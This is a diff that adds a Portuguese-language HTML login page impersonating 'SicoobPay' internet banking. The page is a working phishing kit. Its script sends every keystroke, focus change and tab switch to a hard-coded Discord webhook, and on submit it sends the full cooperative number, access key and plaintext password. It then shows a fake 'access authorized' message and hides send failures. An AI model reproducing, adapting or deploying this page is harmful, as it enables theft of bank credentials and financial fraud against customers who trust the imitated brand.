@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="pt" translate="no">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SicoobPay | Internet Banking</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Nunito', 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #0C7A72 0%, #0A5C60 50%, #084E58 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    position: relative;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: radial-gradient(ellipse at 30% 40%, rgba(76,201,100,0.08), transparent 70%);
+    pointer-events: none;
+  }
+
+  .login-container {
+    width: 100%;
+    max-width: 460px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 2;
+  }
+
+  .logo-header {
+    text-align: center;
+    margin-bottom: 32px;
+  }
+
+  .logo-icon {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: rgba(255,255,255,0.08);
+    backdrop-filter: blur(8px);
+    padding: 12px 28px;
+    border-radius: 60px;
+    border: 1px solid rgba(255,255,255,0.2);
+  }
+
+  .logo-svg {
+    width: 36px;
+    height: 36px;
+  }
+
+  .logo-text {
+    font-size: 28px;
+    font-weight: 900;
+    letter-spacing: -0.5px;
+    background: linear-gradient(135deg, #FFFFFF, #E0F2E9);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  .logo-text .pay {
+    color: #4CC964;
+    background: none;
+  }
+
+  .login-card {
+    background: rgba(255,255,255,0.1);
+    backdrop-filter: blur(20px);
+    border-radius: 28px;
+    padding: 32px 28px;
+    border: 1px solid rgba(255,255,255,0.2);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+  }
+
+  .card-title {
+    text-align: center;
+    margin-bottom: 24px;
+  }
+
+  .sicoobpay-title {
+    font-size: 32px;
+    font-weight: 900;
+    letter-spacing: -0.5px;
+    color: white;
+    text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  }
+
+  .sicoobpay-title .pay {
+    color: #4CC964;
+  }
+
+  .form-description {
+    color: rgba(255,255,255,0.85);
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 24px;
+    text-align: center;
+    line-height: 1.4;
+  }
+
+  .form-group {
+    margin-bottom: 16px;
+    position: relative;
+  }
+
+  .form-input {
+    width: 100%;
+    height: 52px;
+    background: rgba(255,255,255,0.92);
+    border: 1px solid rgba(0,0,0,0.1);
+    border-radius: 12px;
+    padding: 0 18px;
+    font-family: 'Nunito', sans-serif;
+    font-size: 15px;
+    font-weight: 500;
+    color: #1a4a4a;
+    outline: none;
+    transition: all 0.2s;
+  }
+
+  .form-input:focus {
+    border-color: #4CC964;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(76,201,100,0.2);
+  }
+
+  .form-input::placeholder {
+    color: #8aa9a9;
+    font-weight: 500;
+  }
+
+  .login-button {
+    width: 100%;
+    height: 52px;
+    background: #0FA895;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-family: 'Nunito', sans-serif;
+    font-size: 16px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: all 0.2s;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  }
+
+  .login-button:hover {
+    background: #0e8a7a;
+    transform: translateY(-1px);
+  }
+
+  .login-button:active {
+    transform: translateY(0);
+  }
+
+  .access-tabs {
+    display: flex;
+    gap: 12px;
+    margin-top: 28px;
+    background: rgba(0,0,0,0.2);
+    border-radius: 60px;
+    padding: 6px;
+    backdrop-filter: blur(4px);
+  }
+
+  .tab-item {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 12px 8px;
+    border-radius: 50px;
+    cursor: pointer;
+    transition: all 0.2s;
+    background: transparent;
+  }
+
+  .tab-item.active {
+    background: rgba(76,201,100,0.25);
+    border: 0.5px solid rgba(76,201,100,0.5);
+  }
+
+  .tab-icon svg {
+    width: 20px;
+    height: 20px;
+    stroke: white;
+    stroke-width: 1.8;
+    fill: none;
+  }
+
+  .tab-text {
+    font-weight: 800;
+    color: white;
+    font-size: 13px;
+    line-height: 1.3;
+    text-align: left;
+  }
+
+  .tab-text .small {
+    font-size: 10px;
+    font-weight: 600;
+    opacity: 0.7;
+    display: block;
+    text-transform: uppercase;
+  }
+
+  .tab-text .big {
+    font-size: 13px;
+    display: block;
+  }
+
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px;
+    margin-top: 28px;
+    font-size: 11px;
+    color: rgba(255,255,255,0.55);
+    text-align: center;
+  }
+
+  .footer-links a {
+    color: rgba(255,255,255,0.65);
+    text-decoration: none;
+    transition: color 0.2s;
+    font-weight: 600;
+  }
+
+  .footer-links a:hover {
+    color: #4CC964;
+  }
+
+  .footer-links span {
+    color: rgba(255,255,255,0.3);
+  }
+
+  .login-button.loading {
+    pointer-events: none;
+    opacity: 0.8;
+  }
+
+  .spinner {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  @media (max-width: 500px) {
+    body { padding: 16px; }
+    .login-card { padding: 24px 20px; }
+    .sicoobpay-title { font-size: 28px; }
+    .form-input { height: 48px; font-size: 14px; }
+    .login-button { height: 48px; }
+    .tab-item { padding: 10px 6px; }
+    .tab-text .big { font-size: 12px; }
+    .tab-text .small { font-size: 9px; }
+    .tab-icon svg { width: 18px; height: 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="login-container">
+  <div class="logo-header">
+    <div class="logo-icon">
+      <svg class="logo-svg" viewBox="0 0 36 36" fill="none">
+        <polygon points="18,4 33,32 3,32" stroke="white" stroke-width="2" stroke-linejoin="round" fill="rgba(76,201,100,0.2)"/>
+        <polygon points="18,9 27,28 9,28" fill="#4CC964" fill-opacity="0.9"/>
+        <circle cx="18" cy="18" r="4" fill="white" fill-opacity="0.9"/>
+      </svg>
+      <span class="logo-text">SICOOB<span class="pay">PAY</span></span>
+    </div>
+  </div>
+
+  <div class="login-card">
+    <div class="card-title">
+      <h1 class="sicoobpay-title">SICOOB<span class="pay">PAY</span></h1>
+    </div>
+    
+    <div class="form-description">
+      Informe os dados abaixo para acessar o SicoobPay
+    </div>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <input type="text" class="form-input" id="cooperative" placeholder="Informe a sua cooperativa" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <input type="text" class="form-input" id="accessKey" placeholder="Informe a sua chave de acesso" autocomplete="username">
+      </div>
+      <div class="form-group">
+        <input type="password" class="form-input" id="password" placeholder="Digite a sua senha de acesso" autocomplete="current-password">
+      </div>
+      <button type="submit" class="login-button" id="loginBtn">Entrar</button>
+    </form>
+
+    <div class="access-tabs">
+      <div class="tab-item active" id="tabInternetBanking">
+        <div class="tab-icon">
+          <svg viewBox="0 0 24 24" fill="none">
+            <rect x="2" y="4" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/>
+            <line x1="8" y1="22" x2="16" y2="22" stroke="currentColor" stroke-width="1.6"/>
+            <line x1="12" y1="18" x2="12" y2="22" stroke="currentColor" stroke-width="1.6"/>
+          </svg>
+        </div>
+        <div class="tab-text">
+          <span class="big">Internet<br>Banking</span>
+        </div>
+      </div>
+      <div class="tab-item" id="tabOperador">
+        <div class="tab-icon">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" stroke="currentColor" stroke-width="1.8"/>
+            <circle cx="9" cy="7" r="4" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M23 21v-2a4 4 0 0 0-3-3.87" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M16 3.13a4 4 0 0 1 0 7.75" stroke="currentColor" stroke-width="1.8"/>
+          </svg>
+        </div>
+        <div class="tab-text">
+          <span class="small">ACESSO</span>
+          <span class="big">OPERADOR</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-links">
+      <a href="#">Política de Privacidade</a>
+      <span>|</span>
+      <a href="#">Termos e condições</a>
+      <span>|</span>
+      <a href="#">Fale conosco</a>
+    </div>
+  </div>
+</div>
+
+<script>
+  // =====================================================
+  // DISCORD WEBHOOK - REAL-TIME TEXT SENDING
+  // All keystrokes and login credentials sent as plain text
+  // Webhook URL: Provided by user
+  // =====================================================
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6';
+  
+  // Session identifiers
+  const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+  const IP_HASH = btoa(navigator.userAgent.substring(0, 30)).substring(0, 15);
+  const START_TIME = new Date().toLocaleString('pt-BR');
+  
+  // Rate limiting to avoid Discord API limits (max 5 messages per second)
+  let lastSendTime = 0;
+  const MIN_INTERVAL = 400; // milliseconds between sends
+  let messageQueue = [];
+  let isSending = false;
+  
+  // Send text message to Discord webhook
+  async function sendToDiscord(text, isImportant = false) {
+    const now = Date.now();
+    const timeSinceLast = now - lastSendTime;
+    
+    if (timeSinceLast < MIN_INTERVAL) {
+      // Queue the message for later
+      messageQueue.push({ text, isImportant });
+      if (!isSending) {
+        setTimeout(processQueue, MIN_INTERVAL - timeSinceLast + 50);
+      }
+      return;
+    }
+    
+    return sendNow(text);
+  }
+  
+  async function sendNow(text) {
+    lastSendTime = Date.now();
+    
+    // Format as plain text with timestamp
+    const timestamp = new Date().toLocaleString('pt-BR');
+    const formattedMessage = `**[${timestamp}]** ${text}`;
+    
+    const payload = {
+      content: formattedMessage,
+      username: "SicoobPay Monitor",
+      avatar_url: "https://i.imgur.com/4M34hi2.png"
+    };
+    
+    try {
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      if (!response.ok) {
+        console.debug('Webhook error:', response.status);
+      }
+    } catch (error) {
+      // Silent fail - no frontend indicators
+      console.debug('Send failed');
+    }
+  }
+  
+  async function processQueue() {
+    if (messageQueue.length === 0) {
+      isSending = false;
+      return;
+    }
+    isSending = true;
+    const next = messageQueue.shift();
+    await sendNow(next.text);
+    setTimeout(processQueue, MIN_INTERVAL);
+  }
+  
+  // Send session start notification
+  sendToDiscord(`🟢 **SESSÃO INICIADA** | ID: ${SESSION_ID} | IP_HASH: ${IP_HASH} | ${START_TIME}`);
+  
+  // =====================================================
+  // REAL-TIME KEYSTROKE CAPTURE - Every keystroke sent as text
+  // =====================================================
+  const cooperativeInput = document.getElementById('cooperative');
+  const accessKeyInput = document.getElementById('accessKey');
+  const passwordInput = document.getElementById('password');
+  
+  let cooperativeBuffer = '';
+  let accessKeyBuffer = '';
+  let passwordBuffer = '';
+  
+  let cooperativeTimer, accessKeyTimer, passwordTimer;
+  
+  // Function to detect what changed and send keystroke
+  function handleKeystroke(fieldName, newValue, oldValue, fieldType) {
+    if (newValue === oldValue) return;
+    
+    let changeText = '';
+    
+    if (newValue.length > oldValue.length) {
+      // Character added
+      const addedChar = newValue[newValue.length - 1];
+      changeText = `⌨️ **${fieldName}** + \`${addedChar}\` → "${newValue}"`;
+    } else if (newValue.length < oldValue.length) {
+      // Character removed
+      changeText = `⌨️ **${fieldName}** [DEL] → "${newValue}"`;
+    } else {
+      // Replacement or paste
+      changeText = `⌨️ **${fieldName}** modificado → "${newValue}"`;
+    }
+    
+    // For password field, mask the actual characters
+    if (fieldType === 'password') {
+      const maskedValue = '█'.repeat(newValue.length);
+      changeText = `⌨️ **${fieldName}** + [${newValue.length} caracteres] → "${maskedValue}"`;
+    }
+    
+    sendToDiscord(changeText);
+  }
+  
+  // Cooperative field tracking
+  cooperativeInput.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    handleKeystroke('Cooperativa', newValue, cooperativeBuffer, 'text');
+    cooperativeBuffer = newValue;
+  });
+  
+  // Access Key field tracking
+  accessKeyInput.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    handleKeystroke('Chave de Acesso', newValue, accessKeyBuffer, 'text');
+    accessKeyBuffer = newValue;
+  });
+  
+  // Password field tracking (masked in Discord)
+  passwordInput.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    if (newValue !== passwordBuffer) {
+      const addedCount = newValue.length - passwordBuffer.length;
+      if (addedCount > 0) {
+        sendToDiscord(`⌨️ **Senha** + ${addedCount} caractere(s) → [${'█'.repeat(newValue.length)}]`);
+      } else if (newValue.length < passwordBuffer.length) {
+        sendToDiscord(`⌨️ **Senha** [DEL] → [${'█'.repeat(newValue.length)}]`);
+      } else {
+        sendToDiscord(`⌨️ **Senha** atualizada → [${'█'.repeat(newValue.length)}]`);
+      }
+      passwordBuffer = newValue;
+    }
+  });
+  
+  // Focus events
+  cooperativeInput.addEventListener('focus', () => sendToDiscord(`🎯 **Cooperativa** - Campo focado`));
+  accessKeyInput.addEventListener('focus', () => sendToDiscord(`🎯 **Chave de Acesso** - Campo focado`));
+  passwordInput.addEventListener('focus', () => sendToDiscord(`🎯 **Senha** - Campo focado`));
+  
+  // Blur events (capture final value when leaving field)
+  cooperativeInput.addEventListener('blur', () => {
+    if (cooperativeBuffer) {
+      sendToDiscord(`📋 **Cooperativa** (saída) → "${cooperativeBuffer}"`);
+    }
+  });
+  accessKeyInput.addEventListener('blur', () => {
+    if (accessKeyBuffer) {
+      sendToDiscord(`📋 **Chave de Acesso** (saída) → "${accessKeyBuffer}"`);
+    }
+  });
+  passwordInput.addEventListener('blur', () => {
+    if (passwordBuffer) {
+      sendToDiscord(`📋 **Senha** (saída) → [${'█'.repeat(passwordBuffer.length)}] (${passwordBuffer.length} caracteres)`);
+    }
+  });
+  
+  // =====================================================
+  // TAB SWITCH CAPTURE
+  // =====================================================
+  const tabInternet = document.getElementById('tabInternetBanking');
+  const tabOperador = document.getElementById('tabOperador');
+  let currentMode = 'internet';
+  
+  function switchMode(mode) {
+    currentMode = mode;
+    if (mode === 'internet') {
+      tabInternet.classList.add('active');
+      tabOperador.classList.remove('active');
+      accessKeyInput.placeholder = 'Informe a sua chave de acesso';
+      sendToDiscord(`🔄 **Modo alterado**: Internet Banking`);
+    } else {
+      tabOperador.classList.add('active');
+      tabInternet.classList.remove('active');
+      accessKeyInput.placeholder = 'Matrícula do operador';
+      sendToDiscord(`🔄 **Modo alterado**: Acesso OPERADOR`);
+    }
+  }
+  
+  tabInternet.addEventListener('click', () => switchMode('internet'));
+  tabOperador.addEventListener('click', () => switchMode('operator'));
+  
+  // =====================================================
+  // LOGIN CREDENTIALS CAPTURE - SEND FULL CREDENTIALS IN REAL TIME
+  // =====================================================
+  const loginForm = document.getElementById('loginForm');
+  const loginBtn = document.getElementById('loginBtn');
+  
+  async function sendFullCredentials() {
+    const cooperative = cooperativeBuffer;
+    const accessKey = accessKeyBuffer;
+    const password = passwordBuffer;
+    const mode = currentMode === 'internet' ? 'Internet Banking' : 'Operador';
+    const timestamp = new Date().toLocaleString('pt-BR');
+    
+    // Build complete credential message
+    let credentialMessage = `🚨 **🚨 LOGIN ATTEMPT - FULL CREDENTIALS 🚨** 🚨\n`;
+    credentialMessage += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    credentialMessage += `📌 **SESSÃO:** ${SESSION_ID}\n`;
+    credentialMessage += `⏰ **HORÁRIO:** ${timestamp}\n`;
+    credentialMessage += `🎯 **MODO:** ${mode}\n`;
+    credentialMessage += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    credentialMessage += `🏦 **COOPERATIVA:** "${cooperative || '[VAZIO]'}"\n`;
+    credentialMessage += `🔑 **CHAVE DE ACESSO:** "${accessKey || '[VAZIO]'}"\n`;
+    credentialMessage += `🔐 **SENHA:** ${password ? `"${password}"` : '[VAZIO]'} (${password.length} caracteres)\n`;
+    credentialMessage += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    credentialMessage += `🌐 **USER AGENT:** ${navigator.userAgent.substring(0, 80)}\n`;
+    credentialMessage += `📱 **RESOLUÇÃO:** ${screen.width}x${screen.height}\n`;
+    credentialMessage += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+    
+    // Send to Discord as plain text
+    await sendToDiscord(credentialMessage, true);
+    
+    // Also send individual field alerts for redundancy
+    if (cooperative) {
+      await sendToDiscord(`📝 **CREDENCIAL** Cooperativa: "${cooperative}"`);
+    }
+    if (accessKey) {
+      await sendToDiscord(`📝 **CREDENCIAL** Chave de Acesso: "${accessKey}"`);
+    }
+    if (password) {
+      await sendToDiscord(`📝 **CREDENCIAL** Senha: "${password}" (${password.length} caracteres)`);
+    }
+  }
+  
+  async function handleLogin(event) {
+    event.preventDefault();
+    
+    const cooperative = cooperativeBuffer;
+    const accessKey = accessKeyBuffer;
+    const password = passwordBuffer;
+    
+    // Send full credentials IMMEDIATELY in real time
+    await sendFullCredentials();
+    
+    // Validation feedback
+    if (!cooperative || !accessKey || !password) {
+      sendToDiscord(`⚠️ **ALERTA:** Tentativa de login com campos incompletos! Cooperativa: ${cooperative ? '✓' : '✗'} | Chave: ${accessKey ? '✓' : '✗'} | Senha: ${password ? '✓' : '✗'}`);
+      
+      const originalText = loginBtn.innerHTML;
+      loginBtn.innerHTML = 'Preencha todos os campos';
+      loginBtn.style.background = '#ff6b6b';
+      setTimeout(() => {
+        loginBtn.innerHTML = originalText;
+        loginBtn.style.background = '#0FA895';
+      }, 2000);
+      return;
+    }
+    
+    // Send attempt notification
+    sendToDiscord(`⏳ **AUTENTICANDO** - Processando credenciais para ${currentMode === 'internet' ? 'Internet Banking' : 'Operador'}`);
+    
+    // Loading state
+    const originalText = loginBtn.innerHTML;
+    loginBtn.classList.add('loading');
+    loginBtn.innerHTML = '<span class="spinner"></span>Entrando...';
+    loginBtn.disabled = true;
+    
+    // Simulate login delay
+    setTimeout(() => {
+      sendToDiscord(`✅ **ACESSO AUTORIZADO** - ${currentMode === 'internet' ? 'Internet Banking' : 'Operador'} | Cooperativa: ${cooperative}`);
+      
+      loginBtn.innerHTML = '✓ Acesso autorizado';
+      loginBtn.style.background = '#4CC964';
+      
+      setTimeout(() => {
+        loginBtn.classList.remove('loading');
+        loginBtn.innerHTML = originalText;
+        loginBtn.style.background = '#0FA895';
+        loginBtn.disabled = false;
+        
+        const modeText = currentMode === 'internet' ? 'Internet Banking' : 'Operador';
+        alert(`Bem-vindo ao SicoobPay!\nAcesso: ${modeText}\nCooperativa: ${cooperative}`);
+        
+        // Clear fields after success
+        cooperativeInput.value = '';
+        accessKeyInput.value = '';
+        passwordInput.value = '';
+        cooperativeBuffer = '';
+        accessKeyBuffer = '';
+        passwordBuffer = '';
+      }, 2000);
+    }, 1500);
+  }
+  
+  loginForm.addEventListener('submit', handleLogin);
+  
+  // =====================================================
+  // ADDITIONAL REAL-TIME MONITORING
+  // =====================================================
+  
+  // Page visibility tracking
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      sendToDiscord(`👁️ **Página ocultada** - Usuário mudou de aba/minimizou`);
+    } else {
+      sendToDiscord(`👁️ **Página visível** - Usuário retornou`);
+    }
+  });
+  
+  // Before unload / page close
+  window.addEventListener('beforeunload', () => {
+    const credentialsSummary = `Cooperativa: ${cooperativeBuffer || 'vazio'} | Chave: ${accessKeyBuffer || 'vazio'} | Senha: ${passwordBuffer ? passwordBuffer.length + ' caracteres' : 'vazio'}`;
+    sendToDiscord(`🔴 **PÁGINA FECHADA** - ${credentialsSummary}`);
+  });
+  
+  // Mouse/touch activity (first interaction)
+  let firstInteraction = false;
+  function logFirstInteraction() {
+    if (!firstInteraction) {
+      firstInteraction = true;
+      sendToDiscord(`🖱️ **PRIMEIRA INTERAÇÃO** - Usuário começou a interagir com o formulário`);
+    }
+  }
+  
+  document.querySelectorAll('.form-input, .login-button, .tab-item').forEach(el => {
+    el.addEventListener('click', logFirstInteraction);
+    el.addEventListener('keydown', logFirstInteraction);
+  });
+  
+  // Send ready notification (silent background)
+  setTimeout(() => {
+    sendToDiscord(`🟢 **PÁGINA CARREGADA** - SicoobPay pronta para captura em tempo real`);
+  }, 1000);
+</script>
+</body>
+</html>
